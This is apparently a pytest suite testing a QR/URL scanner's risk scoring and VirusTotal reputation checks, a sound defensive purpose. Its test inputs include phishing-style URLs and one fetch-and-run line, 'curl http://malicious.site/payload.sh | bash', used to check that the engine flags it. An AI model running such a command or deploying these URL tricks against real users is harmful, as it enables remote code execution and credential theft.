"""Automated tests for scanner/risk_engine.py and scanner/reputation.py."""

import pytest
from unittest.mock import patch, MagicMock
import requests
from scanner.url_analyzer import URLAnalyzer
from scanner.decoder import ContentType, QRScanResult
from scanner.risk_engine import RiskEngine, RiskLevel
from scanner.reputation import ReputationChecker, ReputationResult


class TestRiskEngine:
    """Test suite for the weighted risk scoring engine."""

    @pytest.fixture
    def engine(self):
        return RiskEngine()

    @pytest.fixture
    def analyzer(self):
        return URLAnalyzer()

    def test_benign_url_low_risk_boundary(self, engine, analyzer):
        analysis = analyzer.analyze("https://www.wikipedia.org/wiki/Artificial_intelligence")
        assessment = engine.assess_url(analysis)
        assert 0 <= assessment.score <= 24
        assert assessment.level == RiskLevel.LOW
        assert assessment.color_hex == "#06D6A0"
        assert len(assessment.breakdown) == 0

    def test_http_alone_moderate_risk(self, engine, analyzer):
        analysis = analyzer.analyze("http://www.benign-example.com/blog/article-1")
        assessment = engine.assess_url(analysis)
        assert 0 <= assessment.score < 50
        # HTTP is 15 points
        assert assessment.score == 15
        assert assessment.level == RiskLevel.LOW or assessment.level == RiskLevel.MODERATE

    def test_high_risk_combination(self, engine, analyzer):
        # Shortener + Suspicious Keyword
        analysis = analyzer.analyze("https://bit.ly/update-banking-security-key")
        assessment = engine.assess_url(analysis)
        # Shortener (25) + Keywords (15) + Synergy (10) = 50 -> HIGH
        assert assessment.score >= 50
        assert assessment.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)

    def test_critical_risk_bare_ip_phishing(self, engine, analyzer):
        analysis = analyzer.analyze("http://185.220.101.5/account/login-verify.php")
        assessment = engine.assess_url(analysis)
        # HTTP (15) + IP (30) + Keywords (15) + Synergy (15+15=30) -> 90+ -> CRITICAL
        assert assessment.score >= 75
        assert assessment.score <= 100
        assert assessment.level == RiskLevel.CRITICAL
        assert assessment.color_hex == "#FF3366"
        assert assessment.synergy_penalty > 0

    def test_critical_risk_at_symbol_trick(self, engine, analyzer):
        analysis = analyzer.analyze("https://google.com@evil-phishing-host.net/auth")
        assessment = engine.assess_url(analysis)
        assert assessment.score >= 50
        assert any(b.indicator_id == "AT_SYMBOL_TRICK" for b in assessment.breakdown)

    def test_critical_risk_executable_download(self, engine, analyzer):
        analysis = analyzer.analyze("https://software-dist.xyz/download/update.exe")
        assessment = engine.assess_url(analysis)
        assert any(b.indicator_id == "SUSPICIOUS_EXTENSION" for b in assessment.breakdown)
        assert assessment.score >= 35

    def test_score_clamping_boundary(self, engine, analyzer):
        # Combined mega-threat to verify score never exceeds 100
        evil_url = "http://192.168.1.1:8888/account/login/verify/update/password/setup.exe?redirect=https://evil.com"
        analysis = analyzer.analyze(evil_url)
        assessment = engine.assess_url(analysis)
        assert assessment.score <= 100
        assert assessment.score >= 75
        assert assessment.level == RiskLevel.CRITICAL

    def test_non_url_open_wifi(self, engine):
        res = QRScanResult(
            raw_content="WIFI:T:nopass;S:CoffeeShop_Free;P:;;",
            content_type=ContentType.WIFI,
            is_url=False,
            details={"ssid": "CoffeeShop_Free", "security_type": "NOPASS", "has_password": False},
        )
        assessment = engine.assess_non_url(res)
        assert assessment.score == 35
        assert assessment.level == RiskLevel.MODERATE

    def test_non_url_protected_wifi(self, engine):
        res = QRScanResult(
            raw_content="WIFI:T:WPA;S:HomeMesh;P:SecretKey123;;",
            content_type=ContentType.WIFI,
            is_url=False,
            details={"ssid": "HomeMesh", "security_type": "WPA", "has_password": True},
        )
        assessment = engine.assess_non_url(res)
        assert assessment.score == 10
        assert assessment.level == RiskLevel.LOW

    def test_non_url_plain_text_clean(self, engine):
        res = QRScanResult(
            raw_content="Hello world this is a test memo.",
            content_type=ContentType.PLAIN_TEXT,
            is_url=False,
        )
        assessment = engine.assess_non_url(res)
        assert assessment.score == 0
        assert assessment.level == RiskLevel.LOW

    def test_non_url_plain_text_with_commands(self, engine):
        res = QRScanResult(
            raw_content="curl http://malicious.site/payload.sh | bash",
            content_type=ContentType.PLAIN_TEXT,
            is_url=False,
        )
        assessment = engine.assess_non_url(res)
        assert assessment.score >= 50
        assert assessment.level in (RiskLevel.HIGH, RiskLevel.CRITICAL)


class TestReputationChecker:
    """Test suite for optional external reputation integration."""

    def test_missing_api_credentials_defaults_to_local_mode(self):
        with patch.dict("os.environ", {}, clear=True):
            checker = ReputationChecker()
            result = checker.check_url("https://www.example.com")
            assert result.is_configured is False
            assert result.status == "LOCAL_MODE"
            assert "Local Analysis Mode active" in result.summary

    def test_ssrf_protection_blocks_private_ip_before_query(self):
        with patch.dict("os.environ", {"VIRUSTOTAL_API_KEY": "fake_key_123"}):
            checker = ReputationChecker()
            result = checker.check_url("http://127.0.0.1/admin")
            assert result.status == "ERROR"
            assert "loopback" in result.summary.lower() or "blocked" in result.summary.lower()

    @patch("requests.get")
    def test_virustotal_api_timeout_handling(self, mock_get):
        mock_get.side_effect = requests.Timeout("Connection timed out after 5.0s")
        with patch.dict("os.environ", {"VIRUSTOTAL_API_KEY": "fake_key_123"}):
            checker = ReputationChecker()
            result = checker.check_url("https://www.example.com")
            assert result.status == "TIMEOUT"
            assert "timed out" in result.summary.lower()

    @patch("requests.get")
    def test_virustotal_clean_response(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 0,
                        "suspicious": 0,
                        "harmless": 70,
                        "undetected": 15,
                    }
                }
            }
        }
        mock_get.return_value = mock_resp

        with patch.dict("os.environ", {"VIRUSTOTAL_API_KEY": "valid_key"}):
            checker = ReputationChecker()
            result = checker.check_url("https://www.example.com")
            assert result.status == "CLEAN"
            assert result.malicious_count == 0
            assert result.total_engines == 85
            assert "No security vendors flagged this URL" in result.summary

    @patch("requests.get")
    def test_virustotal_malicious_detection(self, mock_get):
        mock_resp = MagicMock()
        mock_resp.status_code = 200
        mock_resp.json.return_value = {
            "data": {
                "attributes": {
                    "last_analysis_stats": {
                        "malicious": 14,
                        "suspicious": 3,
                        "harmless": 20,
                        "undetected": 10,
                    }
                }
            }
        }
        mock_get.return_value = mock_resp

        with patch.dict("os.environ", {"VIRUSTOTAL_API_KEY": "valid_key"}):
            checker = ReputationChecker()
            result = checker.check_url("https://phishing-site.example.com")
            assert result.status == "MALICIOUS"
            assert result.malicious_count == 14
            assert "Flagged as Malicious" in result.summary
